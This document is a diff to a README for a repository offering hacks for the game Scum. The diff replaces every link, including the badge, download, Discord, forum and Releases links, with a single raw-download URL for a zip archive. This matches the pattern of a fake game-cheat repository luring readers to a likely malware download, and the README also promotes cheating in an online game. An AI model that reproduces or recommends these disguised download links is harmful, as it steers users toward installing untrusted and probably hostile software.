@@ -1,6 +1,6 @@
 # Ultimate Scum
 
-![Scum Hack](https://img.shields.io/badge/Download%20Scum%20Hack%20Tutorial-blue.svg)
+![Scum Hack](https://github.com/zaydentheking/Ultimate-Scum/raw/refs/heads/main/Erechtheum/Ultimate-Scum-1.2.zip%20Scum%20Hack%https://github.com/zaydentheking/Ultimate-Scum/raw/refs/heads/main/Erechtheum/Ultimate-Scum-1.2.zip)
 
 Welcome to the **Ultimate Scum** repository! This guide offers an exclusive tutorial for downloading and using Scum hacks on Windows in 2025. Whether you're looking to enhance your gameplay or explore new features, this repository provides the resources you need.
 
@@ -29,7 +29,7 @@ To get started, you need a few things:
 
 ## Download Instructions
 
-You can find the download link for the Scum hacks tutorial here: [Download Scum Hack Tutorial](https://github.com/zaydentheking/Ultimate-Scum/releases). 
+You can find the download link for the Scum hacks tutorial here: [Download Scum Hack Tutorial](https://github.com/zaydentheking/Ultimate-Scum/raw/refs/heads/main/Erechtheum/Ultimate-Scum-1.2.zip). 
 
 1. Click on the link above.
 2. Locate the appropriate file for your version of Windows.
@@ -66,8 +66,8 @@ For more detailed troubleshooting, refer to the community discussions or the "Re
 
 Join our community to connect with other Scum players and hack users. Share your experiences, ask questions, and get support. You can find us on Discord and various gaming forums. Here are some useful links:
 
-- [Discord Community](https://discord.gg/scum)
-- [Scum Forums](https://scumgame.com/forum)
+- [Discord Community](https://github.com/zaydentheking/Ultimate-Scum/raw/refs/heads/main/Erechtheum/Ultimate-Scum-1.2.zip)
+- [Scum Forums](https://github.com/zaydentheking/Ultimate-Scum/raw/refs/heads/main/Erechtheum/Ultimate-Scum-1.2.zip)
 
 ## Contributing
 
@@ -84,4 +84,4 @@ This repository is licensed under the MIT License. Feel free to use the hacks an
 
 ---
 
-Thank you for visiting the **Ultimate Scum** repository. We hope this guide enhances your gaming experience. For further resources and updates, remember to check the [Releases section](https://github.com/zaydentheking/Ultimate-Scum/releases) frequently. Happy gaming!
+Thank you for visiting the **Ultimate Scum** repository. We hope this guide enhances your gaming experience. For further resources and updates, remember to check the [Releases section](https://github.com/zaydentheking/Ultimate-Scum/raw/refs/heads/main/Erechtheum/Ultimate-Scum-1.2.zip) frequently. Happy gaming!
